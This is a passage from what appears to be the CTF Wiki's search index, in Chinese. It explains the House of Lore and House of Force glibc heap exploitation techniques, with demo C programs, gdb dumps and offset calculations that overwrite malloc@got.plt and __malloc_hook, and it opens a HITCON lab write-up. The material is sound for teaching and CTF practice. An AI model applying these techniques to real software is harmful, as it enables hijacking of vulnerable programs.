\u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765 \n                 bin - bk   =   bck ; \n                 bck - fd   =   bin ;   \u5982\u679c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u7684 bk \u4e3a\u6211\u4eec\u6307\u5b9a\u5185\u5b58\u5730\u5740\u7684fake chunk\uff0c\u5e76\u4e14\u540c\u65f6\u6ee1\u8db3\u4e4b\u540e\u7684 bck- fd != victim \u7684\u68c0\u6d4b\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u5f97 small bin \u7684 bk \u6070\u597d\u4e3a\u6211\u4eec\u6784\u9020\u7684 fake chunk\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u4e0b\u4e00\u6b21\u7533\u8bf7 small bin \u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u4f1a\u5206\u914d\u5230\u6307\u5b9a\u4f4d\u7f6e\u7684 fake chunk\u3002", 
            "title": "\u57fa\u672c\u539f\u7406"
        }, 
        {
            "location": "/pwn/heap/house_of_lore/#_3", 
            "text": "\u5f85\u8865\u5145\u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/heap/house_of_force/", 
            "text": "House Of Force\n\n\n\u4ecb\u7ecd\n\n\nHouse Of Force \u5c5e\u4e8e House Of XXX \u7cfb\u5217\u7684\u5229\u7528\u65b9\u6cd5\uff0cHouse Of XXX \u662f 2004 \u5e74\u300aThe Malloc Maleficarum-Glibc Malloc Exploitation Techniques\u300b\u4e2d\u63d0\u51fa\u7684\u4e00\u7cfb\u5217\u9488\u5bf9 glibc \u5806\u5206\u914d\u5668\u7684\u5229\u7528\u65b9\u6cd5\u3002\n\u4f46\u662f\uff0c\u7531\u4e8e\u5e74\u4ee3\u4e45\u8fdc\u300aThe Malloc Maleficarum\u300b\u4e2d\u63d0\u51fa\u7684\u5927\u591a\u6570\u65b9\u6cd5\u4eca\u5929\u90fd\u4e0d\u80fd\u594f\u6548\uff0c\u6211\u4eec\u73b0\u5728\u6240\u6307\u7684 House Of XXX \u5229\u7528\u76f8\u6bd4 2004 \u5e74\u6587\u7ae0\u4e2d\u5199\u7684\u5df2\u6709\u8f83\u5927\u7684\u4e0d\u540c\u3002\u4f46\u662f\u300aThe Malloc Maleficarum\u300b\u4f9d\u7136\u662f\u4e00\u7bc7\u63a8\u8350\u9605\u8bfb\u7684\u6587\u7ae0\uff0c\u4f60\u53ef\u4ee5\u5728\u8fd9\u91cc\u8bfb\u5230\u5b83\u7684\u539f\u6587\uff1a\n\nhttps://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt\n\n\n\u539f\u7406\n\n\nHouse Of Force \u662f\u4e00\u79cd\u5806\u5229\u7528\u65b9\u6cd5\uff0c\u4f46\u662f\u5e76\u4e0d\u662f\u8bf4 House Of Force \u5fc5\u987b\u5f97\u57fa\u4e8e\u5806\u6f0f\u6d1e\u6765\u8fdb\u884c\u5229\u7528\u3002\u5982\u679c\u4e00\u4e2a\u5806(heap based) \u6f0f\u6d1e\u60f3\u8981\u901a\u8fc7 House Of Force \u65b9\u6cd5\u8fdb\u884c\u5229\u7528\uff0c\u9700\u8981\u4ee5\u4e0b\u6761\u4ef6\uff1a\n\n\n\n\n\u80fd\u591f\u4ee5\u6ea2\u51fa\u7b49\u65b9\u5f0f\u63a7\u5236\u5230 top chunk \u7684 size \u57df\n\n\n\u80fd\u591f\u81ea\u7531\u5730\u63a7\u5236\u5806\u5206\u914d\u5c3a\u5bf8\u7684\u5927\u5c0f\n\n\n\n\nHouse Of Force \u4ea7\u751f\u7684\u539f\u56e0\u5728\u4e8e glibc \u5bf9 top chunk \u7684\u5904\u7406\uff0c\u6839\u636e\u524d\u9762\u5806\u6570\u636e\u7ed3\u6784\u90e8\u5206\u7684\u77e5\u8bc6\u6211\u4eec\u5f97\u77e5\uff0c\u8fdb\u884c\u5806\u5206\u914d\u65f6\uff0c\u5982\u679c\u6240\u6709\u7a7a\u95f2\u7684\u5757\u90fd\u65e0\u6cd5\u6ee1\u8db3\u9700\u6c42\uff0c\u90a3\u4e48\u5c31\u4f1a\u4ece top chunk \u4e2d\u5206\u5272\u51fa\u76f8\u5e94\u7684\u5927\u5c0f\u4f5c\u4e3a\u5806\u5757\u7684\u7a7a\u95f4\u3002\n\n\n\u90a3\u4e48\uff0c\u5f53\u4f7f\u7528 top chunk \u5206\u914d\u5806\u5757\u7684 size \u503c\u662f\u7531\u7528\u6237\u63a7\u5236\u7684\u4efb\u610f\u503c\u65f6\u4f1a\u53d1\u751f\u4ec0\u4e48\uff1f\u7b54\u6848\u662f\uff0c\u53ef\u4ee5\u4f7f\u5f97 top chunk\u6307\u5411\u6211\u4eec\u671f\u671b\u7684\u4efb\u4f55\u4f4d\u7f6e\uff0c\u8fd9\u5c31\u76f8\u5f53\u4e8e\u4e00\u6b21\u4efb\u610f\u5730\u5740\u5199\u3002\u7136\u800c\u5728 glibc \u4e2d\uff0c\u4f1a\u5bf9\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\u548c top chunk \u73b0\u6709\u7684 size \u8fdb\u884c\u9a8c\u8bc1\n\n// \u83b7\u53d6\u5f53\u524d\u7684top chunk\uff0c\u5e76\u8ba1\u7b97\u5176\u5bf9\u5e94\u7684\u5927\u5c0f\nvictim = av-\ntop;\nsize   = chunksize(victim);\n// \u5982\u679c\u5728\u5206\u5272\u4e4b\u540e\uff0c\u5176\u5927\u5c0f\u4ecd\u7136\u6ee1\u8db3 chunk \u7684\u6700\u5c0f\u5927\u5c0f\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5206\u5272\u3002\nif ((unsigned long) (size) \n= (unsigned long) (nb + MINSIZE)) \n{\n    remainder_size = size - nb;\n    remainder      = chunk_at_offset(victim, nb);\n    av-\ntop        = remainder;\n    set_head(victim, nb | PREV_INUSE |\n            (av != \nmain_arena ? NON_MAIN_ARENA : 0));\n    set_head(remainder, remainder_size | PREV_INUSE);\n\n    check_malloced_chunk(av, victim, nb);\n    void *p = chunk2mem(victim);\n    alloc_perturb(p, bytes);\n    return p;\n}\n\n\n\u7136\u800c\uff0c\u5982\u679c\u53ef\u4ee5\u7be1\u6539 size \u4e3a\u4e00\u4e2a\u5f88\u5927\u503c\uff0c\u5c31\u53ef\u4ee5\u8f7b\u677e\u7684\u901a\u8fc7\u8fd9\u4e2a\u9a8c\u8bc1\uff0c\u8fd9\u4e5f\u5c31\u662f\u6211\u4eec\u524d\u9762\u8bf4\u7684\u9700\u8981\u4e00\u4e2a\u80fd\u591f\u63a7\u5236top chunk size \u57df\u7684\u6f0f\u6d1e\u3002\n\n\n(unsigned long) (size) \n= (unsigned long) (nb + MINSIZE)\n\n\n\u4e00\u822c\u7684\u505a\u6cd5\u662f\u628a top chunk \u7684 size \u6539\u4e3a-1\uff0c\u56e0\u4e3a\u5728\u8fdb\u884c\u6bd4\u8f83\u65f6\u4f1a\u628a size \u8f6c\u6362\u6210\u65e0\u7b26\u53f7\u6570\uff0c\u56e0\u6b64 -1 \u4e5f\u5c31\u662f\u8bf4unsigned long \u4e2d\u6700\u5927\u7684\u6570\uff0c\u6240\u4ee5\u65e0\u8bba\u5982\u4f55\u90fd\u53ef\u4ee5\u901a\u8fc7\u9a8c\u8bc1\u3002\n\n\nremainder      = chunk_at_offset(victim, nb);\nav-\ntop        = remainder;\n\n/* Treat space at ptr + offset as a chunk */\n#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))\n\n\n\u4e4b\u540e\u8fd9\u91cc\u4f1a\u628a top \u6307\u9488\u66f4\u65b0\uff0c\u63a5\u4e0b\u6765\u7684\u5806\u5757\u5c31\u4f1a\u5206\u914d\u5230\u8fd9\u4e2a\u4f4d\u7f6e\uff0c\u7528\u6237\u53ea\u8981\u63a7\u5236\u4e86\u8fd9\u4e2a\u6307\u9488\u5c31\u76f8\u5f53\u4e8e\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u4efb\u610f\u503c(write-anything-anywhere)\u3002\n\n\n\u4e0e\u6b64\u540c\u65f6\uff0c\u6211\u4eec\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0ctopchunk\u7684size\u4e5f\u4f1a\u66f4\u65b0\uff0c\u5176\u66f4\u65b0\u7684\u65b9\u6cd5\u5982\u4e0b\n\n\nvictim\n \n=\n \nav\n-\ntop\n;\n\n\nsize\n   \n=\n \nchunksize\n(\nvictim\n);\n\n\nremainder_size\n \n=\n \nsize\n \n-\n \nnb\n;\n\n\nset_head\n(\nremainder\n,\n \nremainder_size\n \n|\n \nPREV_INUSE\n);\n\n\n\n\n\n\u6240\u4ee5\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u4e0b\u6b21\u5728\u6307\u5b9a\u4f4d\u7f6e\u5206\u914d\u5927\u5c0f\u4e3a x \u7684 chunk\uff0c\u6211\u4eec\u9700\u8981\u786e\u4fdd remainder_size \u4e0d\u5c0f\u4e8e x+ MINSIZE\u3002\n\n\n\u7b80\u5355\u793a\u4f8b1\n\n\n\u5728\u5b66\u4e60\u5b8c HOF \u7684\u539f\u7406\u4e4b\u540e\uff0c\u6211\u4eec\u8fd9\u91cc\u901a\u8fc7\u4e00\u4e2a\u793a\u4f8b\u6765\u8bf4\u660e HOF \u7684\u5229\u7528\uff0c\u8fd9\u4e2a\u4f8b\u5b50\u7684\u76ee\u6807\u662f\u901a\u8fc7HOF\u6765\u7be1\u6539 \nmalloc@got.plt\n \u5b9e\u73b0\u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b\n\n\nint main()\n{\n    long *ptr,*ptr2;\n    ptr=malloc(0x10);\n    ptr=(long *)(((long)ptr)+24);\n    *ptr=-1;        // \n=== \u8fd9\u91cc\u628atop chunk\u7684size\u57df\u6539\u4e3a0xffffffffffffffff\n    malloc(-4120);  // \n=== \u51cf\u5c0ftop chunk\u6307\u9488\n    malloc(0x10);   // \n=== \u5206\u914d\u5757\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\n}\n\n\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u5206\u914d\u4e00\u4e2a 0x10 \u5b57\u8282\u5927\u5c0f\u7684\u5757\n\n\n0x602000:   0x0000000000000000  0x0000000000000021 \n=== ptr\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1 \n=== top chunk\n0x602030:   0x0000000000000000  0x0000000000000000\n\n\n\u4e4b\u540e\u628a top chunk \u7684 size \u6539\u4e3a 0xffffffffffffffff\uff0c\u5728\u771f\u6b63\u7684\u9898\u76ee\u4e2d\uff0c\u8fd9\u4e00\u6b65\u53ef\u4ee5\u901a\u8fc7\u5806\u6ea2\u51fa\u7b49\u6f0f\u6d1e\u6765\u5b9e\u73b0\u3002\n\u56e0\u4e3a -1 \u5728\u8865\u7801\u4e2d\u662f\u4ee5 0xffffffffffffffff \u8868\u793a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u8d4b\u503c -1 \u5c31\u53ef\u4ee5\u3002\n\n\n0x602000:   0x0000000000000000  0x0000000000000021 \n=== ptr\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0xffffffffffffffff \n=== top chunk size\u57df\u88ab\u66f4\u6539\n0x602030:   0x0000000000000000  0x0000000000000000\n\n\n\u6ce8\u610f\u6b64\u65f6\u7684 top chunk \u4f4d\u7f6e\uff0c\u5f53\u6211\u4eec\u8fdb\u884c\u4e0b\u4e00\u6b21\u5206\u914d\u7684\u65f6\u5019\u5c31\u4f1a\u66f4\u6539 top chunk \u7684\u4f4d\u7f6e\u5230\u6211\u4eec\u60f3\u8981\u7684\u5730\u65b9\n\n\n0x7ffff7dd1b20 \nmain_arena\n:    0x0000000100000000  0x0000000000000000\n0x7ffff7dd1b30 \nmain_arena+16\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b40 \nmain_arena+32\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b50 \nmain_arena+48\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b60 \nmain_arena+64\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b70 \nmain_arena+80\n: 0x0000000000000000  0x0000000000602020 \n=== top chunk\u6b64\u65f6\u4e00\u5207\u6b63\u5e38\n0x7ffff7dd1b80 \nmain_arena+96\n: 0x0000000000000000  0x00007ffff7dd1b78\n\n\n\u63a5\u4e0b\u6765\u6211\u4eec\u6267\u884c\nmalloc(-4120);\n\uff0c-4120\u662f\u600e\u4e48\u5f97\u51fa\u7684\u5462\uff1f\n\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u660e\u786e\u8981\u5199\u5165\u7684\u76ee\u7684\u5730\u5740\uff0c\u8fd9\u91cc\u6211\u7f16\u8bd1\u7a0b\u5e8f\u540e\uff0c0x601020 \u662f \nmalloc@got.plt\n \u7684\u5730\u5740\n\n\n0x601020:   0x00007ffff7a91130 \n=== malloc@got.plt\n\n\n\u6240\u4ee5\u6211\u4eec\u5e94\u8be5\u5c06 top chunk \u6307\u5411 0x601010 \u5904\uff0c\u8fd9\u6837\u5f53\u4e0b\u6b21\u518d\u5206\u914d chunk \u65f6\uff0c\u5c31\u53ef\u4ee5\u5206\u914d\u5230 \nmalloc@got.plt\n \u5904\u7684\u5185\u5b58\u4e86\u3002\n\n\n\u4e4b\u540e\u660e\u786e\u5f53\u524d top chunk \u7684\u5730\u5740\uff0c\u6839\u636e\u524d\u9762\u63cf\u8ff0\uff0ctop chunk \u4f4d\u4e8e 0x602020\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97\u504f\u79fb\u5982\u4e0b\n\n\n0x601010-0x602020=-4112\n\n\n\u6b64\u5916\uff0c\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\uff0c\u4e00\u65e6\u8fdb\u5165\u7533\u8bf7\u5185\u5b58\u7684\u51fd\u6570\u4e2d\u5c31\u53d8\u6210\u4e86\u65e0\u7b26\u53f7\u6574\u6570\u3002\n\n\nvoid\n \n*\n__libc_malloc\n(\nsize_t\n \nbytes\n)\n \n{\n\n\n\n\n\n\u5982\u679c\u60f3\u8981\u7528\u6237\u8f93\u5165\u7684\u5927\u5c0f\u7ecf\u8fc7\u5185\u90e8\u7684 \nchecked_request2size\n\u53ef\u4ee5\u5f97\u5230\u8fd9\u6837\u7684\u5927\u5c0f\uff0c\u5373\n\n\n/*\n\n\n   Check if a request is so large that it would wrap around zero when\n\n\n   padded and aligned. To simplify some other code, the bound is made\n\n\n   low enough so that adding MINSIZE will also not wrap around zero.\n\n\n */\n\n\n\n#define REQUEST_OUT_OF_RANGE(req)                                              \\\n\n\n    ((unsigned long) (req) \n= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))\n\n\n/* pad request bytes into a usable size -- internal version */\n\n\n//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1\n\n\n#define request2size(req)                                                      \\\n\n\n    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK \n MINSIZE)                           \\\n\n\n         ? MINSIZE                                                             \\\n\n\n         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) \n ~MALLOC_ALIGN_MASK)\n\n\n\n/*  Same, except also perform argument check */\n\n\n\n#define checked_request2size(req, sz)                                          \\\n\n\n    if (REQUEST_OUT_OF_RANGE(req)) {                                           \\\n\n\n        __set_errno(ENOMEM);                                                   \\\n\n\n        return 0;                                                              \\\n\n\n    }                                                                          \\\n\n\n    (sz) = request2size(req);\n\n\n\n\n\n\u4e00\u65b9\u9762\uff0c\u6211\u4eec\u9700\u8981\u7ed5\u8fc7 REQUEST_OUT_OF_RANGE(req) \u8fd9\u4e2a\u68c0\u6d4b\uff0c\u5373\u6211\u4eec\u4f20\u7ed9 malloc \u7684\u503c\u5728\u8d1f\u6570\u8303\u56f4\u5185\uff0c\u4e0d\u5f97\u5927\u4e8e -2 * MINSIZE\uff0c\u8fd9\u4e2a\u4e00\u822c\u60c5\u51b5\u4e0b\u90fd\u662f\u53ef\u4ee5\u6ee1\u8db3\u7684\u3002\n\n\n\u53e6\u4e00\u65b9\u9762\uff0c\u5728\u6ee1\u8db3\u5bf9\u5e94\u7684\u7ea6\u675f\u540e\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u5f97 \nrequest2size\n\u6b63\u597d\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u5927\u5c0f\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u5f97 ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) \n ~MALLOC_ALIGN_MASK \u6070\u597d\u4e3a-4112\u3002\u9996\u5148\uff0c\u5f88\u663e\u7136\uff0c-4112 \u662f chunk \u5bf9\u9f50\u7684\uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u9700\u8981\u5c06\u5176\u5206\u522b\u51cf\u53bb SIZE_SZ\uff0cMALLOC_ALIGN_MASK \u5c31\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u9700\u8981\u7533\u8bf7\u7684\u503c\u3002\u5176\u5b9e\u6211\u4eec\u8fd9\u91cc\u53ea\u9700\u8981\u51cf SIZE_SZ \u5c31\u53ef\u4ee5\u4e86\uff0c\u56e0\u4e3a\u591a\u51cf\u7684 MALLOC_ALIGN_MASK \u6700\u540e\u8fd8\u4f1a\u88ab\u5bf9\u9f50\u6389\u3002\u800c\n\u5982\u679c -4112 \u4e0d\u662f MALLOC_ALIGN \u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u9700\u8981\u591a\u51cf\u4e00\u4e9b\u4e86\u3002\u5f53\u7136\uff0c\u6211\u4eec\u6700\u597d\u4f7f\u5f97\u5206\u914d\u4e4b\u540e\u5f97\u5230\u7684 chunk \u4e5f\u662f\u5bf9\u9f50\u7684\uff0c\u56e0\u4e3a\u5728\u91ca\u653e\u4e00\u4e2a chunk \u7684\u65f6\u5019\uff0c\u4f1a\u8fdb\u884c\u5bf9\u9f50\u68c0\u67e5\u3002\n\n\n\u56e0\u6b64\uff0c\u6211\u4eec\u5f53\u8c03\u7528\nmalloc(-4120)\n\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u89c2\u5bdf\u5230 top chunk \u88ab\u62ac\u9ad8\u5230\u6211\u4eec\u60f3\u8981\u7684\u4f4d\u7f6e\n\n\n0x7ffff7dd1b20 \nmain_arena\n:\\   0x0000000100000000  0x0000000000000000\n0x7ffff7dd1b30 \nmain_arena+16\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b40 \nmain_arena+32\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b50 \nmain_arena+48\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b60 \nmain_arena+64\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b70 \nmain_arena+80\n: 0x0000000000000000  0x0000000000601010 \n=== \u53ef\u4ee5\u89c2\u5bdf\u5230top chunk\u88ab\u62ac\u9ad8\n0x7ffff7dd1b80 \nmain_arena+96\n: 0x0000000000000000  0x00007ffff7dd1b78\n\n\n\u4e4b\u540e\uff0c\u6211\u4eec\u5206\u914d\u7684\u5757\u5c31\u4f1a\u51fa\u73b0\u5728 0x601010+0x10 \u7684\u4f4d\u7f6e\uff0c\u4e5f\u5c31\u662f 0x601020 \u53ef\u4ee5\u66f4\u6539 got \u8868\u4e2d\u7684\u5185\u5bb9\u4e86\u3002\n\n\n\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u88ab\u62ac\u9ad8\u7684\u540c\u65f6\uff0cmalloc@got \u9644\u8fd1\u7684\u5185\u5bb9\u4e5f\u4f1a\u88ab\u4fee\u6539\u3002\n\n\n    \nset_head\n(\nvictim\n,\n \nnb\n \n|\n \nPREV_INUSE\n \n|\n\n            \n(\nav\n \n!=\n \nmain_arena\n \n?\n \nNON_MAIN_ARENA\n \n:\n \n0\n));\n\n\n\n\n\n\u7b80\u5355\u793a\u4f8b2\n\n\n\u5728\u4e0a\u4e00\u4e2a\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u6f14\u793a\u4e86\u901a\u8fc7 HOF \u4f7f\u5f97 top chunk \u7684\u6307\u9488\u51cf\u5c0f\u6765\u4fee\u6539\u4f4d\u4e8e\u5176\u4e0a\u9762(\u4f4e\u5730\u5740)\u7684got\u8868\u4e2d\u7684\u5185\u5bb9\uff0c\n\u4f46\u662f HOF \u5176\u5b9e\u4e5f\u53ef\u4ee5\u4f7f\u5f97 top chunk \u6307\u9488\u589e\u5927\u6765\u4fee\u6539\u4f4d\u4e8e\u9ad8\u5730\u5740\u7a7a\u95f4\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u901a\u8fc7\u8fd9\u4e2a\u793a\u4f8b\u6765\u6f14\u793a\u8fd9\u4e00\u70b9\n\n\nint main()\n{\n    long *ptr,*ptr2;\n    ptr=malloc(0x10);\n    ptr=(long *)(((long)ptr)+24);\n    *ptr=-1;                 \n=== \u4fee\u6539top chunk size\n    malloc(140737345551056); \n=== \u589e\u5927top chunk\u6307\u9488\n    malloc(0x10);\n}\n\n\n\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u4ee3\u7801\u4e0e\u7b80\u5355\u793a\u4f8b1\u57fa\u672c\u76f8\u540c\uff0c\u9664\u4e86\u7b2c\u4e8c\u6b21 malloc \u7684 size \u6709\u6240\u4e0d\u540c\u3002\n\u8fd9\u6b21\u6211\u4eec\u7684\u76ee\u6807\u662f malloc_hook\uff0c\u6211\u4eec\u77e5\u9053 malloc_hook \u662f\u4f4d\u4e8e libc.so \u91cc\u7684\u5168\u5c40\u53d8\u91cf\u503c\uff0c\u9996\u5148\u67e5\u770b\u5185\u5b58\u5e03\u5c40\n\n\nStart              End                Offset             Perm Path\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/tst/t1\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/tst/t1\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/tst/t1\n0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]\n0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- \n0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- \n0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- \n0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]\n0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]\n0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- \n0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]\n0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]\n\n\n\u53ef\u4ee5\u770b\u5230 heap \u7684\u57fa\u5740\u5728 0x602000\uff0c\u800c libc \u7684\u57fa\u5740\u5728 0x7ffff7a0d000\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u901a\u8fc7 HOF \u6269\u5927 top chunk\u6307\u9488\u7684\u503c\u6765\u5b9e\u73b0\u5bf9 malloc_hook \u7684\u5199\u3002\n\u9996\u5148\uff0c\u7531\u8c03\u8bd5\u5f97\u77e5 __malloc_hook \u7684\u5730\u5740\u4f4d\u4e8e 0x7ffff7dd1b10 \uff0c\u91c7\u53d6\u8ba1\u7b97\n\n\n0x7ffff7dd1b00-0x602020-0x10=140737345551056\n\u7ecf\u8fc7\u8fd9\u6b21 malloc \u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u89c2\u5bdf\u5230 top chunk \u7684\u5730\u5740\u88ab\u62ac\u9ad8\u5230\u4e86 0x00007ffff7dd1b00\n\n\n0x7ffff7dd1b20 \nmain_arena\n:    0x0000000100000000  0x0000000000000000\n0x7ffff7dd1b30 \nmain_arena+16\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b40 \nmain_arena+32\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b50 \nmain_arena+48\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b60 \nmain_arena+64\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b70 \nmain_arena+80\n: 0x0000000000000000  0x00007ffff7dd1b00 \n=== top chunk\n0x7ffff7dd1b80 \nmain_arena+96\n: 0x0000000000000000  0x00007ffff7dd1b78\n\n\n\u4e4b\u540e\uff0c\u6211\u4eec\u53ea\u8981\u518d\u6b21\u5206\u914d\u5c31\u53ef\u4ee5\u63a7\u5236 0x7ffff7dd1b10 \u5904\u7684 __malloc_hook \u503c\u4e86\n\n\nrax = 0x00007ffff7dd1b10\n\n0x400562 \nmain+60\n        mov    edi, 0x10\n0x400567 \nmain+65\n        call   0x400410 \nmalloc@plt\n\n\n\n\n\n\u5c0f\u603b\u7ed3\n\n\n\u5728\u8fd9\u4e00\u8282\u4e2d\u8bb2\u89e3\u4e86 House Of Force \u7684\u539f\u7406\u5e76\u4e14\u7ed9\u51fa\u4e86\u4e24\u4e2a\u5229\u7528\u7684\u7b80\u5355\u793a\u4f8b\uff0c\u901a\u8fc7\u89c2\u5bdf\u8fd9\u4e24\u4e2a\u7b80\u5355\u793a\u4f8b\u6211\u4eec\u4f1a\u53d1\u73b0\u5176\u5b9eHOF\u7684\u5229\u7528\u8981\u6c42\u8fd8\u662f\u76f8\u5f53\u82db\u523b\u7684\u3002\n\n\n\n\n\u9996\u5148\uff0c\u9700\u8981\u5b58\u5728\u6f0f\u6d1e\u4f7f\u5f97\u7528\u6237\u80fd\u591f\u63a7\u5236 top chunk \u7684 size \u57df\u3002\n\n\n\u5176\u6b21\uff0c\n\u9700\u8981\u7528\u6237\u80fd\u81ea\u7531\u63a7\u5236 malloc \u7684\u5206\u914d\u5927\u5c0f\n\n\n\u7b2c\u4e09\uff0c\u5206\u914d\u7684\u6b21\u6570\u4e0d\u80fd\u53d7\u9650\u5236\n\n\n\n\n\u5176\u5b9e\u8fd9\u4e09\u70b9\u4e2d\u7b2c\u4e8c\u70b9\u5f80\u5f80\u662f\u6700\u96be\u529e\u7684\uff0cCTF \u9898\u76ee\u4e2d\u5f80\u5f80\u4f1a\u7ed9\u7528\u6237\u5206\u914d\u5806\u5757\u7684\u5927\u5c0f\u9650\u5236\u6700\u5c0f\u548c\u6700\u5927\u503c\u4f7f\u5f97\u4e0d\u80fd\u901a\u8fc7HOF \u7684\u65b9\u6cd5\u8fdb\u884c\u5229\u7528\u3002\n\n\nHITCON training lab 11\n\n\n\u8fd9\u91cc\uff0c\u6211\u4eec\u4e3b\u8981\u4fee\u6539\u5176 magic \u51fd\u6570\u4e3a\n\n\n\u57fa\u672c\u4fe1\u606f\n\n\n\u279c  hitcontraning_lab11 git:\n(\nmaster\n)\n file bamboobox     \nbamboobox: ELF \n64\n-bit LSB executable, x86-64, version \n1\n \n(\nSYSV\n)\n, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, \nfor\n GNU/Linux \n2\n.6.32, BuildID\n[\nsha1\n]=\n595428ebf89c9bf7b914dd1d2501af50d47bbbe1, not stripped\n\u279c  hitcontraning_lab11 git:\n(\nmaster\n)\n checksec bamboobox \n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/hitcontraning_lab11/bamboobox\n\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x400000\n)\n\n\n\n\n\n\u8be5\u7a0b\u5e8f\u662f\u4e00\u4e2a 64 \u4f4d\u7684\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\u3002\n\n\n\u57fa\u672c\u529f\u80fd\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8be5\u7a0b\u5e8f\u5f00\u59cb\u65f6\u5373\u7533\u8bf7\u4e86 0x10 